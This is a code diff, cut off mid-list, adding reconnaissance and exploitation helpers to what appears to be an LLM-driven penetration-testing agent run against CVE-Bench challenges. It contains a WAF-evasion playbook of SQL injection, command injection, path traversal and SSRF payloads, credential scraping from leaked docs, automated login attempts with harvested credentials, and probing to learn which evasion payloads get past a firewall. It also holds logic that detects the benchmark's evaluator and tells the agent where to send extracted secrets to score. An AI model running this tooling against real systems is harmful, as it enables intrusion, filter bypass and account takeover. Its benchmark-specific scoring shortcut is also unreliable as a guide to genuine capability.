+    # CVE-Bench evaluator autodetect: every CVE-Bench challenge exposes an evaluator on
+    # target:9091 that owns the objective (POST /upload to submit File Access / Database
+    # Access proofs; GET /done to check verdict). Without this, description-only synth has
+    # no idea the extracted secret has to go anywhere — it produces a payload that runs
+    # cleanly and never scores. When 9091 answers with the CVE-Bench signature, inject
+    # authoritative sink guidance directly into the recon output so it reaches synth.
+    if 9091 in open_ports:
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=2.5) as cli:
+                r = cli.get(f"http://{ip}:9091/done")
+                body = (r.text or "")[:400]
+                # CVE-Bench evaluator responses always have a JSON `status` field
+                if r.status_code in (200, 404) and ("status" in body or "attack" in body):
+                    header += ("  CVE-BENCH SINK DETECTED on port 9091 — this is the "
+                               "evaluator, NOT part of the app. To complete File Access "
+                               "the extracted file bytes MUST be POSTed to "
+                               f"http://{ip}:9091/upload with JSON body "
+                               "{\"/tmp/secret\": \"<file_content>\"}; for Database "
+                               "Access POST {\"secret\": \"<message>\"}; check success "
+                               f"with `curl -s http://{ip}:9091/done`.")
+        except Exception:  # noqa: BLE001
+            pass
+    return header + "\n" + "\n".join(lines)
+
+
+# WAF fingerprints: (needle-in-body-or-header, human-name, evasion-family). A hit on
+# any needle in ANY response tells us the target has this WAF. Ordered by specificity
+# so a Chinese-WAF match wins over a generic "blocked" match.
+_WAF_FINGERPRINTS = [
+    # (needle, name, evasion_family)
+    ("网站防火墙",                     "Chinese WAF (安全狗/宝塔/云锁 family)", "chinese_cms"),
+    ("请求带有不合法参数",              "Chinese WAF (bt/aegis)",              "chinese_cms"),
+    ("cf-ray",                          "Cloudflare",                          "cloudflare"),
+    ("cloudflare",                      "Cloudflare",                          "cloudflare"),
+    ("Attention Required! | Cloudflare","Cloudflare",                          "cloudflare"),
+    ("AWS WAF",                         "AWS WAF",                             "aws_waf"),
+    ("The request could not be satisfied", "AWS CloudFront/WAF",               "aws_waf"),
+    ("Access Denied",                   "Akamai / generic",                    "akamai"),
+    ("Reference #",                     "Akamai / F5",                         "akamai"),
+    ("Sucuri Website Firewall",         "Sucuri",                              "sucuri"),
+    ("Sucuri/Cloudproxy",               "Sucuri",                              "sucuri"),
+    ("mod_security",                    "ModSecurity",                         "modsecurity"),
+    ("modsecurity",                     "ModSecurity",                         "modsecurity"),
+    ("Not Acceptable!",                 "ModSecurity",                         "modsecurity"),
+    ("Incapsula incident ID",           "Imperva Incapsula",                   "incapsula"),
+    ("_Incapsula_Resource",             "Imperva Incapsula",                   "incapsula"),
+    ("The requested URL was rejected",  "F5 BIG-IP ASM",                       "f5_asm"),
+    ("Generated by Wordfence",          "Wordfence",                           "wordfence"),
+    ("wordfence",                       "Wordfence",                           "wordfence"),
+    ("blocked by the security rules",   "generic WAF",                         "generic"),
+    ("has been blocked",                "generic WAF",                         "generic"),
+]
+
+# Per-family payload variants the LLM should try when a WAF is detected. Grouped by
+# vulnerability class -> evasion techniques appropriate to that WAF family. Feeds into
+# the strategist prompt and the refine loop.
+_WAF_EVASION_PLAYBOOK = {
+    "chinese_cms": {  # 网站防火墙 etc — regex-based blocklist, weak against encoding/comments
+        "RCE / COMMAND INJECTION": [
+            "case swap: `?p=iD` `?p=Id`", "IFS bypass: `?p=id${IFS}-a` or `?p=id$IFS$9-a`",
+            "backtick chain: \"?p=\\`id\\`\"", "brace expand: `?p={id,-a}`",
+            "hex escape: `?p=$'\\x69\\x64'`", "encoded semicolon: `?p=id%3Bid`",
+            "printf: `?p=$(printf 'i\\x64')`",
+        ],
+        "SQL injection": [
+            "inline comments: `' /*!OR*/ '1'='1--`", "no-space UNION: `'UNION/**/SELECT`",
+            "case swap: `' Or '1'='1--`", "url-encoded: `%27+OR+%271%27%3D%271--`",
+            "double-encode: `%2527`", "backtick: `' OR `1`=`1--`", "hex: `0x27`",
+            "boolean-blind: `AND (SELECT 1 FROM (SELECT SLEEP(3))a)`",
+        ],
+        "LFI / path traversal": [
+            "double-encoding: `%252e%252e%252f`", "backslash: `..\\..\\..\\etc\\passwd`",
+            "unicode: `%c0%af`", "null byte: `../../../etc/passwd%00`",
+            "PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`",
+        ],
+        "SSRF": [
+            "hex IP: `http://0x7f000001/`", "decimal: `http://2130706433/`",
+            "@ trick: `http://target@127.0.0.1/`", "DNS rebinding target",
+        ],
+    },
+    "cloudflare": {
+        "RCE / COMMAND INJECTION": [
+            "unusual charset: `?p=id&_=1`", "custom User-Agent (not curl)",
+            "Accept-Encoding tricks", "chunked transfer encoding",
+        ],
+        "SQL injection": [
+            "MySQL comment: `1/*!50000UNION*/SELECT`",
+            "case + comments: `Un/**/ion`", "encoded: `%c0%aeor%c0%ae`",
+        ],
+    },
+    "modsecurity": {
+        "RCE / COMMAND INJECTION": [
+            "case swap + IFS: `?p=Id$IFS-a`", "wildcards: `?p=/???/??`",
+            "brace expand", "$@ splitting", "encoded newlines: `%0a`",
+        ],
+        "SQL injection": [
+            "comment injection: `/*!50000*/`", "case swap all keywords",
+            "no-space with backticks: `'OR\\`1\\`=\\`1`",
+        ],
+    },
+    "aws_waf": {
+        "RCE / COMMAND INJECTION": [
+            "small chunks", "unusual method: PUT instead of GET",
+            "non-standard body encoding",
+        ],
+        "SQL injection": [
+            "encoded quote: `%2527`", "unicode alternatives",
+            "MySQL specific comment syntax",
+        ],
+    },
+    "generic": {
+        "RCE / COMMAND INJECTION": [
+            "case swap", "URL encoding", "double URL encoding",
+            "whitespace substitution (%09 tab, %20 space, %0a newline)",
+            "comment injection where syntax allows",
+        ],
+        "SQL injection": [
+            "case swap all keywords", "inline comments `/**/` between keywords",
+            "URL encoding of quotes and equals",
+        ],
+    },
+}
+
+
+def _waf_evasion_hint(waf_family, vuln_class):
+    """Return an evasion-hint string for this (waf_family, vuln_class) pair. Falls back
+    to the generic playbook if the family has no specific entry for this class."""
+    if not waf_family:
+        return ""
+    family_book = _WAF_EVASION_PLAYBOOK.get(waf_family, {})
+    generic_book = _WAF_EVASION_PLAYBOOK.get("generic", {})
+    # Try exact class match, then a class-family match, then generic
+    variants = family_book.get(vuln_class)
+    if not variants:
+        for k in family_book:
+            if any(w in vuln_class.upper() for w in k.upper().split()):
+                variants = family_book[k]
+                break
+    if not variants:
+        variants = generic_book.get(vuln_class, generic_book.get("SQL injection", []))
+    if not variants:
+        return ""
+    return "; ".join(variants[:6])
+
+
+# Framework fingerprints: (body-needle, framework-name, probe-endpoints-for-deep-enum).
+# When one of these hits, _deep_enum_framework fires the endpoints to pin the version
+# and surface known-CVE-bearing endpoints.
+_FRAMEWORK_FINGERPRINTS = [
+    # (needle, name, [probe_paths])
+    ("wp-content",           "WordPress",   ["/wp-json/wp/v2/users", "/wp-includes/version.php", "/wp-login.php", "/readme.html", "/wp-json/"]),
+    ("wp-includes",          "WordPress",   ["/wp-json/wp/v2/users", "/readme.html"]),
+    ("/administrator/",      "Joomla",      ["/administrator/manifests/files/joomla.xml", "/language/en-GB/en-GB.xml"]),
+    ("Joomla!",              "Joomla",      ["/administrator/manifests/files/joomla.xml"]),
+    ("Drupal",               "Drupal",      ["/CHANGELOG.txt", "/core/CHANGELOG.txt", "/user/login"]),
+    ("LyLme Spage",          "LyLme Spage", ["/apply/", "/pwd/", "/include/", "/data/config.php"]),
+    ("Spage",                "LyLme Spage", ["/apply/", "/pwd/"]),
+    ("phpMyAdmin",           "phpMyAdmin",  ["/phpmyadmin/README", "/phpmyadmin/ChangeLog"]),
+    ("Directus",             "Directus",    ["/server/info", "/users/me"]),
+    ("MediaWiki",            "MediaWiki",   ["/api.php?action=query&meta=siteinfo&format=json"]),
+    ("Grafana",              "Grafana",     ["/api/health", "/login"]),
+    ("Jenkins",              "Jenkins",     ["/api/json", "/manage", "/login"]),
+    ("Kibana",               "Kibana",      ["/api/status"]),
+    ("Prometheus",           "Prometheus",  ["/api/v1/status/config"]),
+]
+
+# Info-disclosure probes: paths that COMMONLY leak version/config/creds when misconfigured.
+# Fired once against every target regardless of framework, cheap (~1s total).
+_INFO_DISCLOSURE_PROBES = [
+    "/robots.txt", "/sitemap.xml", "/.env", "/.git/config", "/.git/HEAD",
+    "/package.json", "/composer.json", "/config.php.bak", "/backup.zip",
+    "/phpinfo.php", "/info.php", "/server-status", "/server-info",
+    "/actuator/env", "/actuator/health", "/.DS_Store", "/README.md",
+    "/CHANGELOG.md", "/config.yml", "/debug", "/?debug=1", "/?trace=1",
+]
+
+# Auth-wall signatures: response indicates a login is required. When detected, the
+# deep-enum layer can try default creds for the identified stack.
+_AUTH_WALL_SIGNALS = [
+    "please log in", "sign in", "login required", "authentication required",
+    "unauthorized", "401", "WWW-Authenticate", "csrf token",
+    "<title>login", "<title>sign in", "<title>访问管理",
+]
+
+
+def _mine_response(url, resp, tag="mine"):
+    """Extract bypass/version/hidden-endpoint signals from one HTTP response.
+    Returns a dict of extracted intel — headers, cookies, tech-stack matches, HTML/JS
+    comments (first 6), hidden form inputs, error-stack hints, auth-wall flag,
+    framework matches. Never raises."""
+    import re as _re
+    intel = {"url": url, "status": None, "tag": tag}
+    try:
+        intel["status"] = resp.status_code
+        # Headers of interest — these often name the exact tech + version
+        wanted_hdrs = ("server", "x-powered-by", "x-cdn", "x-cache", "cf-ray",
+                       "x-sucuri-id", "x-firewall-version", "x-drupal-cache",
+                       "x-generator", "x-aspnet-version", "x-runtime")
+        intel["headers"] = {h: resp.headers.get(h) for h in wanted_hdrs
+                            if resp.headers.get(h)}
+        # Cookies — session mechanism + framework-identifying names
+        set_cookie = resp.headers.get("set-cookie", "")
+        cookie_names = list(dict.fromkeys(
+            _re.findall(r"(?:^|,\s*)([A-Za-z0-9_-]+)=", set_cookie)))[:6]
+        if cookie_names:
+            intel["cookies"] = cookie_names
+        body = (resp.text or "")[:60000]
+        intel["body_len"] = len(body)
+        # Framework match
+        for needle, name, _probes in _FRAMEWORK_FINGERPRINTS:
+            if needle.lower() in body.lower():
+                intel["framework"] = name
+                intel["framework_needle"] = needle
+                break
+        # Auth wall?
+        for sig in _AUTH_WALL_SIGNALS:
+            if sig.lower() in body.lower():
+                intel["auth_wall"] = sig
+                break
+        # HTML comments (first 6) — dev notes, hidden endpoints, debug flags
+        comments = [c.strip()[:160] for c in _re.findall(r"<!--(.*?)-->", body, _re.S)][:6]
+        if comments:
+            intel["html_comments"] = comments
+        # JS-style comments in scripts (block only)
+        js_comments = [c.strip()[:160] for c in _re.findall(r"/\*(.*?)\*/", body, _re.S)][:4]
+        if js_comments:
+            intel["js_comments"] = js_comments
+        # Hidden inputs — often reveal CSRF tokens or hidden fields the LLM should include
+        hidden_inputs = list(dict.fromkeys(
+            _re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\']', body, _re.I)))[:8]
+        if hidden_inputs:
+            intel["hidden_inputs"] = hidden_inputs
+        # Error / stack hints
+        error_hints = []
+        for pat, tag2 in [(r"([A-Z][a-zA-Z]+Error): ([^\n]{0,120})", "exception"),
+                           (r"Stack trace:\s*(#0[^\n]{0,180})",       "stacktrace"),
+                           (r"(Warning: [^\n]{0,140})",                "php_warning"),
+                           (r"(Fatal error: [^\n]{0,140})",            "php_fatal"),
+                           (r"on line (\d+) of ([^\s<]+)",             "location")]:
+            for m in _re.finditer(pat, body):
+                error_hints.append(f"{tag2}: {' | '.join(m.groups())[:180]}")
+                if len(error_hints) >= 4:
+                    break
+        if error_hints:
+            intel["error_hints"] = error_hints
+        # Version hints in body
+        vmatches = _re.findall(r"(?:version|v(?:er)?)\s*[:=\-]?\s*(\d+\.\d+(?:\.\d+)?)", body, _re.I)
+        if vmatches:
+            intel["version_hints"] = list(dict.fromkeys(vmatches))[:5]
+        # Non-static HREFs (endpoints the app links to, may include hidden)
+        hrefs = list(dict.fromkeys(
+            _re.findall(r'href=["\'](/[a-zA-Z0-9_\-/.]+(?:\.(?:php|jsp|aspx|py|cgi))?)["\']', body)))[:8]
+        if hrefs:
+            intel["hrefs"] = hrefs
+        # Credential + admin-path hints from README / docs / config leaks — these are
+        # gold: many CMSes ship with default creds AND their READMEs leak the admin URL.
+        # A leaked README with "admin/123456" + admin path is basically a foothold handed
+        # to us. Extract creds in common phrasings + admin/backend/dashboard URLs.
+        cred_pairs = []
+        for pat in (
+            # "账号密码：`admin`/`123456`" or "username: admin password: 123456"
+            r"(?:账号|username|user|login)[:\s`']+([A-Za-z][A-Za-z0-9_.-]{0,30})[`'\s]*[/:,\s]+(?:密码|password|pass|pwd)[:\s`']+([^\s`'<>]{3,40})",
+            r"(?:密码|password|pass|pwd)[:\s`']+([^\s`'<>]{3,40})[`'\s]*[/:,\s]+(?:账号|username|user|login)[:\s`']+([A-Za-z][A-Za-z0-9_.-]{0,30})",
+            # `admin`/`123456` shorthand
+            r"`([A-Za-z][A-Za-z0-9_.-]{2,30})`\s*[/:]\s*`([^`\s]{3,40})`",
+            # "default admin/password"
+            r"default\s+(?:credentials?)?\s*[:\-]\s*([A-Za-z][A-Za-z0-9_.-]{0,30})\s*[/:]\s*([^\s<>]{3,40})",
+        ):
+            for m in _re.finditer(pat, body, _re.I):
+                a, b = m.group(1), m.group(2)
+                if a and b and 3 <= len(b) <= 40:
+                    cred_pairs.append(f"{a}:{b}")
+        if cred_pairs:
+            intel["credential_hints"] = list(dict.fromkeys(cred_pairs))[:5]
+        # Admin/backend/dashboard paths mentioned in docs
+        admin_paths = list(dict.fromkeys(
+            _re.findall(r"[`'\"](\/(?:admin|backend|dashboard|manage(?:ment)?|console|install|setup|login)[a-zA-Z0-9_\-/.]*)[`'\"]", body)))[:5]
+        if admin_paths:
+            intel["admin_paths"] = admin_paths
+    except Exception:  # noqa: BLE001
+        pass
+    return intel
+
+
+def _scout_response_mine(ip, port, timeout=4):
+    """Fire the info-disclosure probes + baseline and extract deterministic intel from
+    every response. Returns (guidance_text, intel_list). Fast (~1-3s total, parallelized)
+    and idempotent. Feeds two downstream things: the reactive deep-enum step
+    (_deep_enum_framework) and the strategist (bypass angles, hidden endpoints, exact
+    tech versions, exposed credentials, debug flags)."""
+    import httpx as _hx, concurrent.futures as _cf
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    probes = ["/"] + _INFO_DISCLOSURE_PROBES
+    intel_list = []
+    def _fetch(path):
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+                r = cli.get(base + path)
+                return path, r
+        except Exception:  # noqa: BLE001
+            return path, None
+    with _cf.ThreadPoolExecutor(max_workers=12) as ex:
+        for path, r in ex.map(_fetch, probes):
+            if r is None:
+                continue
+            item = _mine_response(base + path, r, tag="disclosure" if path != "/" else "landing")
+            intel_list.append(item)
+    # Filter to responses that gave us something useful — 200s with content, or a
+    # 500 with error hints, or any framework/auth-wall/cookie hit.
+    signal = [x for x in intel_list
+              if x.get("status") in (200, 500)
+              or any(k in x for k in ("framework", "auth_wall", "error_hints",
+                                       "hidden_inputs", "html_comments", "cookies",
+                                       "version_hints"))]
+    if not signal:
+        return "", intel_list
+    # Compact summary for the LLM + operator
+    parts = []
+    frameworks = list(dict.fromkeys(x.get("framework") for x in signal if x.get("framework")))
+    if frameworks:
+        parts.append(f"FRAMEWORK: {', '.join(frameworks)}")
+    versions = list(dict.fromkeys(v for x in signal for v in x.get("version_hints", [])))
+    if versions:
+        parts.append(f"VERSION HINTS: {', '.join(versions[:6])}")
+    all_hdrs = {}
+    for x in signal:
+        for k, v in (x.get("headers") or {}).items():
+            all_hdrs.setdefault(k, set()).add(v)
+    if all_hdrs:
+        parts.append("HEADERS: " + "; ".join(
+            f"{k}={list(v)[0][:40]}" for k, v in list(all_hdrs.items())[:6]))
+    all_cookies = list(dict.fromkeys(c for x in signal for c in x.get("cookies", [])))
+    if all_cookies:
+        parts.append(f"COOKIES: {', '.join(all_cookies[:6])}")
+    disclosures = [x for x in signal if x.get("tag") == "disclosure" and x.get("status") == 200]
+    if disclosures:
+        parts.append("INFO DISCLOSURE (200 on):\n  "
+                     + "\n  ".join(f"{x['url']} ({x['body_len']} bytes)"
+                                    for x in disclosures[:6]))
+    aw = [x for x in signal if x.get("auth_wall")]
+    if aw:
+        parts.append(f"AUTH WALL detected: {aw[0]['auth_wall']!r} at {aw[0]['url']}")
+    hidden = list(dict.fromkeys(h for x in signal for h in x.get("hidden_inputs", [])))
+    if hidden:
+        parts.append(f"HIDDEN FORM INPUTS: {', '.join(hidden[:8])}")
+    comments_all = [c for x in signal for c in x.get("html_comments", []) if c.strip()]
+    if comments_all:
+        parts.append("HTML COMMENTS (dev notes / hidden endpoints):\n  "
+                     + "\n  ".join(f"'{c[:120]}'" for c in comments_all[:5]))
+    errors = [e for x in signal for e in x.get("error_hints", [])]
+    if errors:
+        parts.append("ERROR HINTS: " + " | ".join(errors[:4]))
+    hrefs_all = list(dict.fromkeys(h for x in signal for h in x.get("hrefs", [])))
+    if hrefs_all:
+        parts.append(f"LINKED PATHS: {', '.join(hrefs_all[:10])}")
+    # Credential hints and admin paths get top-billing — these are the biggest gains
+    # from response mining (default creds in a leaked README = handed foothold).
+    cred_all = list(dict.fromkeys(c for x in signal for c in x.get("credential_hints", [])))
+    if cred_all:
+        parts.insert(0, f"CREDENTIAL HINTS (from mined docs/READMEs — TRY THESE FIRST): "
+                        + ", ".join(cred_all[:6]))
+    admin_all = list(dict.fromkeys(a for x in signal for a in x.get("admin_paths", [])))
+    if admin_all:
+        parts.insert(0 if not cred_all else 1,
+                     f"ADMIN/BACKEND PATHS (from mined docs): {', '.join(admin_all[:6])}")
+    guidance = ("RESPONSE INTEL (mined from " + str(len(intel_list))
+                + " probes across the target — includes info-disclosure attempts):\n"
+                + "\n".join(f"  * {p}" for p in parts))
+    return guidance, intel_list
+
+
+def _deep_enum_framework(ip, port, framework, intel_list=None, timeout=3):
+    """When _mine_response detected a specific framework, probe its known
+    version/config endpoints to pin the version and surface framework-specific
+    known-CVE-bearing paths. Returns compact guidance; empty when the framework
+    isn't in _FRAMEWORK_FINGERPRINTS or its probes returned nothing useful."""
+    import httpx as _hx
+    if not framework:
+        return ""
+    probes = []
+    for needle, name, paths in _FRAMEWORK_FINGERPRINTS:
+        if name == framework:
+            probes = paths
+            break
+    if not probes:
+        return ""
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    hits = []
+    try:
+        with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+            for path in probes[:8]:
+                try:
+                    r = cli.get(base + path)
+                    if r.status_code in (200, 401, 403):
+                        hits.append(f"{path} -> {r.status_code} ({len(r.text or '')} bytes)")
+                except Exception:  # noqa: BLE001
+                    continue
+    except Exception:  # noqa: BLE001
+        return ""
+    if not hits:
+        return ""
+    return (f"FRAMEWORK DEEP-ENUM ({framework}): probed known version/config endpoints — "
+            f"live results:\n  " + "\n  ".join(hits)
+            + f"\n  These are known-CVE-bearing paths for {framework}; the strategist "
+              "should consider them as primary/alternative attack surface before "
+              "guessing at generic endpoints.")
+
+
+def _verify_strategist_plan(ip, port, plan_text, session_cookie=None, timeout=3):
+    """Detect strategist hallucinations by empirically probing every proposed
+    (endpoint, param, class) tuple BEFORE synth wastes iters on a made-up vector.
+    Three checks per candidate:
+      1. Endpoint exists — GET returns not-404 (or configured 200/301/302/401/403)
+      2. Param is honored — GET with `?<param>=canary` differs from baseline
+      3. Class-plausible — for RCE/SQLi/LFI, a class-specific canary probe returns
+         something other than the same page a bogus param would (length delta,
+         error signal, distinct status)
+    Every candidate gets a verdict: LIVE / SUSPECT / FAKE. FAKE entries are stripped
+    from the plan text handed to synth; SUSPECT entries stay with a warning; LIVE
+    entries are annotated as such. Fails soft: on any exception the plan is unchanged.
+    Returns (annotated_plan, {label: verdict})."""
+    if not plan_text or "PRIMARY:" not in plan_text:
+        return plan_text, {}
+    import httpx as _hx, re as _re
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    # Extract PRIMARY + ALTs from the plan text (regex over the compact string form).
+    candidates = []
+    for m in _re.finditer(
+        r"(PRIMARY|ALT\d):\s+class=(\S+)\s+endpoint=(\S+)\s+param=(\S+)",
+        plan_text,
+    ):
+        candidates.append({"label": m.group(1), "class": m.group(2),
+                           "endpoint": m.group(3), "param": m.group(4)})
+    if not candidates:
+        return plan_text, {}
+    hdrs = {}
+    if session_cookie:
+        hdrs["Cookie"] = session_cookie
+    # Get baseline of the endpoint (no param) so we can diff against a probe.
+    def _fetch(path, params=None):
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=timeout,
+                             headers=hdrs) as cli:
+                r = cli.get(base + path, params=params or {})
+                return r.status_code, len(r.text or ""), (r.text or "")[:600]
+        except Exception:  # noqa: BLE001
+            return None, 0, ""
+    verdicts = {}
+    notes = []
+    for c in candidates:
+        endpoint = c["endpoint"]; param = c["param"]; cls = c["class"].upper()
+        # 1. Endpoint existence check
+        st, ln, body = _fetch(endpoint)
+        if st is None:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(f"{c['label']} endpoint={endpoint} FAKE (network error)")
+            continue
+        if st == 404:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(f"{c['label']} endpoint={endpoint} FAKE (404)")
+            continue
+        base_len = ln
+        # 2. Param-honored check — send a benign canary as the param value; if the
+        # response is byte-identical to baseline, the app ignores this param.
+        canary = "z3st4v"
+        st2, ln2, body2 = _fetch(endpoint, {param: canary})
+        if st2 is None:
+            verdicts[c["label"]] = "SUSPECT"
+            notes.append(f"{c['label']} param={param} SUSPECT (probe error)")
+            continue
+        param_honored = (st2 != st) or (abs(ln2 - base_len) > 10) or (canary in body2)
+        if not param_honored:
+            verdicts[c["label"]] = "FAKE"
+            notes.append(
+                f"{c['label']} endpoint={endpoint} exists but param `{param}` is IGNORED "
+                f"(baseline={base_len}, probed={ln2} — no delta)")
+            continue
+        # 3. Class-plausible check
+        class_probe = None
+        expect_signal = None
+        if "RCE" in cls or "COMMAND" in cls:
+            class_probe = f"{canary};echo INJx"; expect_signal = "INJx"
+        elif "SQLI" in cls or "SQL" in cls:
+            class_probe = f"{canary}'"; expect_signal = "sql|syntax|mysql|mariadb|sqlite|pg"
+        elif "LFI" in cls or "TRAVERSAL" in cls:
+            class_probe = "../../../../etc/passwd"; expect_signal = "root:x:|nobody:|www-data"
+        elif "SSRF" in cls:
+            class_probe = "http://127.0.0.1:1/"; expect_signal = None
+        if class_probe:
+            st3, ln3, body3 = _fetch(endpoint, {param: class_probe})
+            hit = False
+            if expect_signal:
+                if _re.search(expect_signal, body3, _re.I):
+                    hit = True
+            else:
+                # No canonical expected signal — accept any distinct response
+                if st3 != st or abs(ln3 - base_len) > 100:
+                    hit = True
+            if hit:
+                verdicts[c["label"]] = "LIVE"
+                notes.append(f"{c['label']} {cls} on {endpoint}?{param}= — LIVE "
+                             f"({class_probe!r} triggered class-specific signal)")
+            else:
+                verdicts[c["label"]] = "SUSPECT"
+                notes.append(
+                    f"{c['label']} {cls} on {endpoint}?{param}= — SUSPECT "
+                    f"(param honored but class-canary {class_probe!r} did not trigger "
+                    f"a {cls}-specific signal)")
+        else:
+            verdicts[c["label"]] = "LIVE"
+            notes.append(f"{c['label']} endpoint+param honored (class not probed)")
+    # Rewrite the plan text: strip FAKE, annotate SUSPECT/LIVE. Never strip everything
+    # (synth needs something to work on) — if all candidates went FAKE, keep them with
+    # a warning banner so synth knows recon didn't back the plan.
+    live_or_suspect = [c for c in candidates if verdicts.get(c["label"]) in ("LIVE", "SUSPECT")]
+    banner = ("PLAN VERIFICATION (empirically probed on THIS target — hallucinations "
+              "detected below):\n  " + "\n  ".join(notes) + "\n")
+    if not live_or_suspect:
+        return banner + "\n" + plan_text, verdicts
+    # For plan text, replace any FAKE PRIMARY with the highest-verdict ALT.
+    new_plan = plan_text
+    if verdicts.get("PRIMARY") == "FAKE":
+        # Find the first live ALT and promote it in the plan text
+        for c in candidates:
+            if c["label"] != "PRIMARY" and verdicts.get(c["label"]) == "LIVE":
+                # Swap the PRIMARY: block with the ALT block (best-effort in text)
+                new_plan = new_plan.replace(
+                    "PRIMARY:", f"PRIMARY-WAS-FAKE (endpoint={candidates[0]['endpoint']}) — PROMOTED-{c['label']} to PRIMARY:", 1)
+                break
+    return banner + "\n" + new_plan, verdicts
+
+
+def _try_mined_credentials(ip, port, credential_hints, admin_paths=None, timeout=4):
+    """When response mining extracted credentials from a README/docs, try to actually
+    log in with them. Iterates cred_hints × candidate admin login paths × common field-
+    name permutations. On a successful login, returns the session cookie + path so the
+    synth can build an authenticated PoC directly rather than assuming unauth. Trace as
+    recon:auto_login.
+    Success detection: (a) Set-Cookie with a non-empty session-like value AND redirect
+    or (b) response body contains "welcome" / "dashboard" / "logout" / "success"
+    without an "invalid" / "error" / "failed" marker."""
+    if not credential_hints:
+        return None
+    import httpx as _hx, re as _re
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    candidate_paths = list(dict.fromkeys(
+        (admin_paths or []) + [
+            "/admin/login.php", "/admin/index.php", "/admin/", "/admin",
+            "/login", "/login.php", "/wp-login.php", "/user/login",
+            "/manage/login", "/auth/login", "/administrator/index.php",
+        ]))[:8]
+    # Common field-name permutations for the login form
+    field_pairs = [
+        ("user", "pass"), ("username", "password"), ("user", "password"),
+        ("email", "password"), ("name", "pwd"), ("account", "password"),
+        ("login", "password"), ("user", "pwd"),
+    ]
+    success_words = ("welcome", "dashboard", "logout", "sign out", "退出",
+                     "control panel", "successfully", "profile", "settings",
+                     "后台管理", "管理面板")
+    fail_words = ("invalid", "incorrect", "failed", "error", "wrong",
+                   "验证码", "captcha", "验证失败", "denied", "unauthorized")
+    # First pass: prefilter candidate paths — must be REAL login pages (200/302, with
+    # form + password field), and skip captcha-guarded ones (no OCR here). Empty result
+    # returns a structured skip rather than a silent None so the caller can log why.
+    real_login_paths = []
+    captcha_paths = []
+    for path in candidate_paths:
+        try:
+            with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
+                r = cli.get(base + path)
+                if r.status_code >= 400:
+                    continue  # 404 / server error — not a real login page
+                body = (r.text or "")[:8000]
+                blow = body.lower()
+                # Must contain a password-ish input to be a login form
+                looks_like_login = _re.search(
+                    r'<input[^>]+type=["\']?password["\']?', body, _re.I) is not None
+                if not looks_like_login:
+                    continue
+                if any(k in blow for k in ("captcha", "authcode", "verify code",
+                                             "验证码", "vcode", "check_code")):
+                    captcha_paths.append(path)
+                    continue
+                real_login_paths.append(path)
+        except Exception:  # noqa: BLE001
+            continue
+    if not real_login_paths:
+        reason = ("no login form found on any candidate path" if not captcha_paths
+                   else "all candidate login pages require captcha")
+        return {"skipped": True, "reason": reason,
+                "captcha_paths": captcha_paths}
+    captcha_free_paths = real_login_paths  # rename for the loop below
+    for cred in credential_hints:
+        if ":" not in cred:
+            continue
+        username, password = cred.split(":", 1)
+        for path in captcha_free_paths:
+            for u_field, p_field in field_pairs:
+                try:
+                    with _hx.Client(verify=False, follow_redirects=False,
+                                     timeout=timeout) as cli:
+                        data = {u_field: username, p_field: password}
+                        r = cli.post(base + path, data=data)
+                        set_cookie = r.headers.get("set-cookie", "")
+                        body = (r.text or "")[:2000].lower()
+                        # A 302/303 to a non-login page + a Set-Cookie is the strongest signal
+                        location = r.headers.get("location", "").lower()
+                        redirected_off_login = (
+                            r.status_code in (301, 302, 303, 307)
+                            and location
+                            and "login" not in location
+                            and "err" not in location)
+                        has_session_cookie = bool(_re.search(
+                            r"(PHPSESSID|JSESSIONID|SESSIONID|session|token|auth|csrf)=[^;]{8,}",
+                            set_cookie, _re.I))
+                        body_success = (
+                            any(w in body for w in success_words)
+                            and not any(w in body for w in fail_words))
+                        if (redirected_off_login and has_session_cookie) or body_success:
+                            # Extract just the cookie name=value pairs
+                            cookies = _re.findall(r"([A-Za-z0-9_.-]+=[^;]+)", set_cookie)
+                            cookie_header = "; ".join(cookies) if cookies else set_cookie
+                            return {
+                                "path": path, "cred": cred,
+                                "u_field": u_field, "p_field": p_field,
+                                "cookie_header": cookie_header,
+                                "signal": ("redirect+cookie" if redirected_off_login
+                                            else "body-success-word"),
+                            }
+                except Exception:  # noqa: BLE001
+                    continue
+    return None
+
+
+def _characterize_waf(ip, port, family, timeout=4):
+    """When a WAF is detected, PROBE it with real evasion variants to learn what
+    actually gets through. This turns the generic playbook into empirical evidence:
+    'these three variants pass the WAF right now on this target; these six get blocked'.
+    Strategist uses the proven-passable set instead of guessing.
+
+    We test SIX shape families per vuln class (RCE / SQLi / LFI) — case swap, encoding,
+    comment injection, whitespace substitution, backticks/expansion, hex escape — plus
+    the baseline plain payload as a control. A variant is 'PASSED' when it returns HTTP
+    200 with no WAF fingerprint in the body; 'BLOCKED' when the fingerprint matches;
+    'INCONCLUSIVE' otherwise (rare — mismatched content-type, network glitch)."""
+    import httpx as _hx
+    if not family:
+        return "", {}
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    # Shape families — {class: [(label, payload_value), ...]}. Values are URL-safe
+    # (we URL-encode when substituting). Each label names the technique.
+    shapes = {
+        "RCE": [
+            ("plain",       ";id"),
+            ("case-swap",   ";iD"),
+            ("$IFS bypass", ";id${IFS}-a"),
+            ("backtick",    ";`id`"),
+            ("brace expand",";{id,-a}"),
+            ("hex escape",  ";$'\\x69\\x64'"),
+            ("encoded ;",   "%3Bid"),
+        ],
+        "SQLi": [
+            ("plain",           "' OR '1'='1--"),
+            ("case-swap",       "' Or '1'='1--"),
+            ("inline /**/",     "' /*!OR*/ '1'='1--"),
